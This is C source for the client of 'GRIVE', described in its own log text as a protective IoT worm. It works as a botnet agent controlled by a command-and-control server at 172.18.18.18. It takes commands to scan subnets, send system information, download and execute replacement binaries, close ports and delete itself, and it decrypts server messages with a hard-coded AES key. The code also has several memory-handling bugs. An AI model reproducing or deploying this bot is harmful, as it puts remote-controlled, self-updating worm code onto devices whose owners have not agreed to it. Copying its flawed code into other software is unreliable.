 #define _GNU_SOURCE  
 //Client side C/C++ program to demonstrate Socket
// programming
#include <arpa/inet.h>
#include <stdio.h>
#include<stdlib.h>
#include <time.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <stdbool.h>
#include <errno.h>
#include "connection.h"
#include "reporter.h"
#include "security.h"
#define PORT 8080

#define AES_KEY_SIZE_128        16
#define AES_KEY_SIZE_192        24
#define AES_KEY_SIZE_256        32
#define AES_BLOCK_SIZE          16

int main(int c, char *argv[]){

     int sockfd, valread;
     int BOT_ID = 0;
     char a;

     char* action = (char*) malloc(18*sizeof(char));
     char* log = (char*) malloc(30*sizeof(char));
     char* mess = (char*) malloc(100*sizeof(char));
     char*sub_mask = (char*) malloc(2*sizeof(char));
     
     char*buffer = (char*) malloc(1024*sizeof(char));
     char* address = (char*) malloc(15*sizeof(char));
     char* add = (char*) malloc(15*sizeof(char));
     char* ID = (char*) malloc(4*sizeof(char));
     char* size = (char*) malloc(3*sizeof(char));
     char* ip = (char*) malloc(12*sizeof(char));
     char* ending = (char*) malloc(3*sizeof(char));
     int length = 0;
     sprintf(ip, "172.18.18.18");
    // char ip[12] = "172.18.18.18";
     //char  ending[3] = "end";
     sprintf(ending, "end");
     
    memset(buffer, 0, 1024);
    memset(add, 0, 15);
    memset(address, 0, 15);
    memset(log, 0, 30);
    memset(mess, 0, 100);

    // notify the owner in the logfile.txt the aim of the project 
    FILE* logfile = fopen("/tmp/GRIVE_logfile.txt", "a");
    if(logfile != NULL){
        memset(mess, 0, 100);
        sprintf(mess, "GRIVE is a project that aim to protect your device from being infected by IoT worms.");
        fprintf(logfile, "%s \n", mess);
        memset(mess, 0, 100);
        sprintf(mess, "ATTENTION!! Your device is vulnerable, you must update your frimware!!");
        fprintf(logfile, "%s \n", mess);
        memset(mess, 0, 100);
        sprintf(mess, "For more information, you can visit Grive repesotory on github.");
        fprintf(logfile, "%s \n", mess);
    }
    fclose(logfile);

    sprintf(mess, "Scanning in process");
    sprintf(log, "The grive has arrived.");
    printLog(log);
    memset(log, 0, 30);
    
    // printf("Try to connect to the C&C Server:5000.\n ");
    sockfd = create_connection(5000, ip);
     //printf("The socket descriptor is: %d.\n", sockfd);
     
    if(sockfd > -1){
    
        memset(buffer, 0, sizeof buffer); 
        memset(address, 0, sizeof address); 
        sprintf(log, "Connected to the server.");
        printLog(log);
        memset(log, 0, 30);

    
	    valread = read(sockfd, buffer, 1024);

	    while( valread > 0){
                    memset(size, 0, 3); 
                    memcpy(size, buffer, 2*sizeof(char));
                    size[2]='\0';
                    length = atoi(size);
                   // printf("%d\n",  length);
            if( buffer[2] == '0'){

                if (buffer[3] == '0'){ 
                    
                    // 00 ID: "00 <bot id>"
                   // printf("The server gives us an ID: \n");
                    // we have to extract the bot ID from the buffer.
                    memcpy(ID, &buffer[5], 4*sizeof(*buffer));
                    for (BOT_ID = 0; (unsigned)*ID-'0'<10; ID++) 
                        BOT_ID = 10*BOT_ID+(*ID-'0');
                 //printf("%d \n", BOT_ID);
                 sprintf(action, "Receive an ID %d", BOT_ID);
                 send_msg(sockfd, log_editor(action, true), BOT_ID);
                 printLog(log_editor(action, true));
                 print_repo(log_editor(action, true));

                }else if( buffer[3] == '1'){ 

                    //01 SCAN: "01 <ip>/<mask>"
                    send_msg(sockfd, log_editor(mess, true), BOT_ID);
                    memset(mess, 0, sizeof(mess));
                    memset(address, 0, 15); 
                    memset(sub_mask, 0, 2);
                    int i ;
                    for (  i = 4 ; i < 20 ; i++ ){
                        if ( buffer [i] == '/' )
                            break;
                        else{
                         address [i - 4] = buffer [i];
                        }
                     }
                    sub_mask [0] = buffer [i+1];
                    sub_mask [1] = buffer [i+2];
                    sprintf(mess, "Scanning the %s/%s", address, sub_mask);
                    printLog(log_editor(mess, true));
                    print_repo(log_editor(mess, true));
                    scan_sub(address, atoi(sub_mask), sockfd, BOT_ID);

                }else if( buffer[3] == '2'){
                    //02 SYSTEM INFO: "02"
                    // printf("[C&C] Command:\t");
                    // printf("The server request the system info!!\n");
                    system_info(sockfd);
                    memset(log, 0, 30);
                    sprintf(log, "Send SystemInfo, success = 1.");
                    print_repo(log);
                    printLog(log);

                }else if( buffer[3] == '3'){

                    //03 Update BINARIES: "03 <file name>"
                    // the filename must be always be grivexx.out
                    char* filename = (char*) malloc(12*sizeof(char));
                    memset(filename, 0, 11);
                    memcpy(filename, &buffer[5], 11*sizeof(char));
                    filename[11]='\0';
                    printf ("the file name is : %s \n", filename);
                    update(filename);
                    char* path = (char*) malloc(14*sizeof(char));
                    path[0]='.';
                    path[1]='/';
                    path[13]='\0';
                    memcpy(&path[2], &buffer[5], 11*sizeof(char));
                    char *args[]={path, NULL};
                    close(sockfd);
                    remove(argv[0]);
                    memset(log, 0, 30);
                    sprintf(log, "Update grive, success = 1.");
                    print_repo(log);
                    printLog(log);
                    execvp(args[0],args);


                }else if( buffer[3] == '4'){

                    // 04 SEND REPORT: "04"
                    printf("[C&C] Command:\t");
                    printf("Send report command.\n");
                    report(sockfd, BOT_ID);
            
                }else if( buffer[3] == '5'){

                     // 05 PROTECT: "05"
                    printf("[C&C] Command:\t");
                    printf("Grive will protect the device. \n");
                    closePort(23); // telnet 
                    closePort(2323); // alternatice telnet 
                    closePort(5358); // some port that might be used by malwares
                    closePort(5555); // same
                    closePort(7547); // same
                    memset(log, 0, 30);
                    sprintf(log, "PROTECTED");
                    send_msg(sockfd, log_editor(log, true), BOT_ID);
                    memset(log, 0, 30);
                    sprintf(log, "Port 23,2323, 5358 is closed.");
                    printLog(log);
                    print_repo(log);
                    memset(log, 0, 30);
                    sprintf(log, "Port 5555, 7547 is closed.");
                    printLog(log);
                    print_repo(log);

                }else if( buffer[3] == '6'){
                    // 06 ADVANCED: "06"
                    printf("[C&C] Command:\t");
                    printf("a new features. \n");
                }else if( buffer[3] == '7'){

                    // 07 KILL: "07"
                    printf("[C&C] Command:\t");
                    printf("Oups its time to say Good Bye :| \n ");
                    remove(argv[0]);
                    printf("Have an awesome day :)\n");
                    memset(log, 0, 30);
                    sprintf(log, "It is time to forever rest.");
                    send_msg(sockfd, log, BOT_ID);
                    printLog(log);
                    print_repo(log);
                    close(sockfd);
                    return 0;

                }else if( buffer[3] == '8'){

                    // 08 trying the encoding decoding fuctionality
                    printf("[C&C] Command:\t");
                    printf("try the encode/decode :| \n ");
                    printf("%s\n", base64_encode(buffer));
                    printf("%s\n", base64_decode(base64_encode(buffer)));
                    secure_msg();
                    return 0;

                }else{
            
                     printf("NOT A COMMAND!!\t");
                     printf("See the protocol.\n");
                     printf("[C&C] Message:\t");
                     printf("%s\n", buffer);
                     printf("the size is:%ld\n",sizeof(buffer));
                     printf("the size is:%ld\n",sizeof(ending));
                }
        
            }else if(memmem(buffer, sizeof buffer, ending, sizeof ending) != NULL){

                printf("Have an awesome day :)\n");
                memset(log, 0, 30);
                sprintf(log, "It is time to forever rest.");
                printLog(log);
                close(sockfd);
                return 0;

            }else{   

                printf("[C&C] Message:\t");
                printf("%s\n", buffer);

		char* encoded = (char*) malloc(24*sizeof(char));
		char* decoded = (char*) malloc(16*sizeof(char));
		int count1=2;
		int count2=0;
        const uint8_t  key[16] ={0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6, 0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c};
        uint8_t* unsi_decoded = (uint8_t*) malloc(16*sizeof(uint8_t));
        AesContext context;
        AesInitialise128(key, &context);
        uint8_t* unsi_plain = (uint8_t*) malloc(16*sizeof(uint8_t));
	    char* final_output = (char*) malloc(1024*sizeof(char));
        
while(count1 <= length){
		memcpy(encoded,&buffer[count1], 24);
		count1+=24;
        //printf("%s\n", encoded);
		 decoded = base64_decode(encoded);
		 //printf("%s\n", decoded);
        	// deciphering
                 memcpy(unsi_decoded, (uint8_t*) decoded, 16);
                 AesDecrypt(&context, unsi_decoded, unsi_plain);
                 memcpy(&final_output[count2], (char*) unsi_plain, 16);
		 count2+=16;
		}
        final_output[count2]='\0';
        //printf("f[%d] = %s", count2, final_output[count2]);
        printf("%s\n", final_output);

		}
            
            memset(buffer, 0, sizeof buffer); 
            valread = read(sockfd, buffer, 1024);
    
        }
	
    }
     
     printf("Have an awesome day :)\n");
     memset(log, 0, 30);
     sprintf(log, "It is time to forever rest.");
     send_msg(sockfd, log, BOT_ID);
     printLog(log);

// cleaning before leaving
     remove(argv[0]);
     close(sockfd);
     free(log);
     free(action);
     free(mess);
     free(sub_mask);
     free(buffer);
     free(address);
     free(add);
     free(ID);
     return 0;
 }